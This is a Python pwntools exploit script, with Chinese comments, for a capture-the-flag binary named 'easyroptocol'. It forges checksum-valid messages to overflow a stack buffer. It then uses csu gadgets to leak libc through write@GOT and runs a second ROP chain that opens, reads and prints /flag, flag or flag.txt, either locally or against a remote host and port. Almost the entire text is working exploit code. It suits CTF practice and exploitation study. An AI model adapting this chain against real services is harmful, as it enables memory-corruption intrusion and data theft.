#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""easyROPtocol —— seccomp 沙箱 + 4 槽 message 溢出 + 两阶段 ORW ROP

保护：amd64 / No PIE / NX / Partial RELRO / 无 canary / stripped
沙箱：init@0x401296 先 prctl(PR_SET_NO_NEW_PRIVS) + prctl(PR_SET_SECCOMP, FILTER)，
      8 条 BPF 只拦 execve(59) 与 x32 ABI（nr >= 0x40000000）-> open/read/write 全放行
菜单：1 新建消息（malloc(0x1000) + read(0, chunk, 0x1000)，两道校验）
      2 删除消息（按索引 free + 置 NULL）
      3 提交（4 条消息从 +0x18 起 memcpy 到 rbp-0x3020，每条增长 0xfe8）
      4 退出

栈布局：buf = rbp-0x3020
  4 次 memcpy 的 dest = 0 / 0xfe8 / 0x1fd0 / 0x2fb8
  saved RIP = buf+0x3028 -> 落在第 4 条消息的 +0x88

两阶段：
  stage1  csu 调 write(1, write@got, 8) 泄漏 libc，再 ret 回 main(0x401a5e)
  stage2  删除 slot3 后重建（free 与 top 合并，malloc 拿回同一地址），
          新链先 read(0, bss, 0x40) 收 open/exit 地址与 3 个候选路径，
          依次 open("/flag" / "flag" / "flag.txt") -> read(3) -> write(1) -> exit(0)

用法：
  python 24_easyroptocol_exp.py                  # 本地（自动建临时 flag.txt）
  python 24_easyroptocol_exp.py remote HOST PORT # 远端（用同目录 libc-2.31.so）
"""

import os
import struct
import sys
import tempfile

from pwn import *

context(os="linux", arch="amd64", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "easyroptocol")
LIBC_REMOTE = os.path.join(HERE, "libc-2.31.so")

# ---- 二进制内 gadget / 地址（objdump 实测） ----
CSU_POP = 0x401BAA       # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_CALL = 0x401B90      # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
RET = 0x40101A           # ret（栈对齐垫片）
MAIN = 0x401A5E          # main 入口，stage1 结束后回到菜单
WRITE_GOT = 0x404028
READ_GOT = 0x404040

# ---- .bss 页内可写区（RW LOAD 覆盖 0x403e10..0x405000） ----
BSS = 0x404700           # +0x00 open 指针 / +0x10 exit 指针 / +0x18 起 3 个路径
BSS_OUT = 0x404800       # flag 读缓冲

# ---- message 格式 ----
MSG_SIZE = 0x1000
MSG_DATA = 0x18          # 校验头长度，也是 memcpy 的源偏移
GROWTH = 0xFE8           # 单次 memcpy 后 strlen 的增量（gdb 实测）
CHAIN_OFF = 0x88         # 第 4 条 message 内 chain 的位置（0x3028-3*0xfe8+0x18）
SEQS = (1, 0x1001, 0x2001, 0x3001)

# 校验和用的 12 字节 key（check2@0x401590 里的立即数）
KEY = b"fakeipheadfa"
KEY_XOR = 0
for _i in range(0, len(KEY), 2):
    KEY_XOR ^= struct.unpack("<H", KEY[_i:_i + 2])[0]


def checksum(msg: bytes) -> int:
    """check2@0x401590：0x800 个 word 全异或（跳过 word[8]），再异或 key。"""
    s = 0
    for i, w in enumerate(struct.unpack("<2048H", msg)):
        if i == 8:
            continue
        s ^= w
    return s ^ KEY_XOR


def build_msg(seq: int, payload: bytes = b"") -> bytes:
    """构造一条能同时通过 check1(0x4014af) 与 check2(0x401590) 的消息。"""
    assert len(payload) <= GROWTH, (len(payload), GROWTH)
    m = bytearray(MSG_SIZE)
    struct.pack_into("<H", m, 0x00, 0x766E)   # "nv"
    struct.pack_into("<H", m, 0x02, 0x28B7)
    struct.pack_into("<I", m, 0x04, seq)      # 提交时的匹配序号
    struct.pack_into("<I", m, 0x08, 0xDEADBEEF)
    struct.pack_into("<H", m, 0x0C, 6)        # (6 & 0xf)*4 = 0x18 -> memcpy 分支
    struct.pack_into("<H", m, 0x0E, 0x1111)   # != 0
    struct.pack_into("<H", m, 0x12, 0)        # == 0
    struct.pack_into("<H", m, 0x14, 0x2222)   # != 0（走 memcpy 而非 strcpy）
    struct.pack_into("<H", m, 0x16, 0xFFFF)   # 必须 == 0xffff
    m[MSG_DATA:MSG_DATA + len(payload)] = payload
    struct.pack_into("<H", m, 0x10, checksum(bytes(m)))
    return bytes(m)


def csu(target_ptr: int, edi: int, rsi: int, rdx: int) -> bytes:
    """一次 __libc_csu_init 调用：call [target_ptr]（rbx=0, rbp=1）。"""
    return flat(
        CSU_POP,
        0, 1, edi, rsi, rdx, target_ptr,
        CSU_CALL,
        0,                          # add rsp,8 丢弃
        0, 0, 0, 0, 0, 0,           # pop rbx..r15
    )


def chain_msg(seq: int, chain: bytes) -> bytes:
    """把 chain 放到消息 +0x88（= buf+0x3028，第 4 次 memcpy 的范围内）。"""
    payload = bytearray(b"A" * GROWTH)
    off = CHAIN_OFF - MSG_DATA       # 0x70
    payload[off:off + len(chain)] = chain
    return build_msg(seq, bytes(payload))


def wait_menu(io: tube) -> None:
    io.recvuntil(b"4. Quit.\n")


def add_msg(io: tube, msg: bytes) -> None:
    # 菜单是 read(0, buf, 8) + atoi：一次写满 8 字节，避免吞掉消息头；
    # 菜单和整条消息合并成一次发送，让随后的 read(0x1000) 尽量一次拿全
    io.send(b"1\n" + b"\x00" * 6 + msg)
    wait_menu(io)


def del_msg(io: tube, idx: int) -> None:
    io.send(b"2\n" + b"\x00" * 6)
    io.send(str(idx).encode() + b"\n" + b"\x00" * 6)
    io.recvuntil(b"Done!\n")
    wait_menu(io)


def build_stage1() -> bytes:
    # write(1, write@got, 8) 泄漏 libc，再回 main
    return csu(WRITE_GOT, 1, WRITE_GOT, 8) + flat(RET, MAIN)


def build_stage2() -> bytes:
    # read(0, BSS, 0x40)：收 open/exit 指针与三条候选路径
    return b"".join((
        csu(READ_GOT, 0, BSS, 0x40),
        csu(BSS, BSS + 0x18, 0, 0),          # open("/flag")
        csu(BSS, BSS + 0x20, 0, 0),          # open("flag")
        csu(BSS, BSS + 0x28, 0, 0),          # open("flag.txt")
        csu(READ_GOT, 3, BSS_OUT, 0x100),    # read(3, BSS_OUT, 0x100)
        csu(WRITE_GOT, 1, BSS_OUT, 0x100),   # write(1, BSS_OUT, 0x100)
        csu(BSS + 0x10, 0, 0, 0),            # exit(0)
    ))


def start(remote_args=None):
    if remote_args:
        host, port = remote_args
        io = remote(host, int(port))
        libc = ELF(LIBC_REMOTE, checksec=False)
        log.info("remote %s:%s, libc=%s", host, port, LIBC_REMOTE)
        return io, libc

    flag_dir = tempfile.mkdtemp(prefix="easyroptocol_")
    with open(os.path.join(flag_dir, "flag.txt"), "wb") as f:
        f.write(b"__PWNED__{easyroptocol_local_ok}\n")
    io = process(BIN, cwd=flag_dir)
    # io.libs() 返回 {路径: 基址}，按文件名挑出 libc
    libc_path = next(p for p in io.libs() if p.endswith("libc.so.6"))
    libc = ELF(libc_path, checksec=False)
    log.info("local flag dir %s, libc=%s", flag_dir, libc_path)
    return io, libc


def pwn() -> None:
    if len(sys.argv) >= 4 and sys.argv[1].lower() == "remote":
        io, libc = start((sys.argv[2], sys.argv[3]))
    else:
        io, libc = start(None)

    wait_menu(io)

    for seq in SEQS[:3]:
        add_msg(io, build_msg(seq, b"A" * GROWTH))
    add_msg(io, chain_msg(SEQS[3], build_stage1()))

    io.send(b"3\n" + b"\x00" * 6)
    io.recvuntil(b"Done.\n")
    leak = u64(io.recvn(8))
    libc.address = leak - libc.symbols["write"]
    log.success("write@libc = %#x, libc base = %#x", leak, libc.address)

    block = bytearray(0x40)
    struct.pack_into("<Q", block, 0x00, libc.symbols["open"])
    struct.pack_into("<Q", block, 0x10, libc.symbols["exit"])
    block[0x18:0x1E] = b"/flag\x00"
    block[0x20:0x25] = b"flag\x00"
    block[0x28:0x31] = b"flag.txt\x00"

    wait_menu(io)
    del_msg(io, 3)
    add_msg(io, chain_msg(SEQS[3], build_stage2()))

    io.send(b"3\n" + b"\x00" * 6 + bytes(block))
    io.recvuntil(b"Done.\n")
    out = io.recvn(0x100)
    text = out.split(b"\x00", 1)[0]
    if text:
        log.success("flag: %s", text.decode(errors="replace").strip())
    else:
        log.warning("没有读到内容（本地 /flag、flag、flag.txt 都不存在？）")
    io.close()


if __name__ == "__main__":
    pwn()
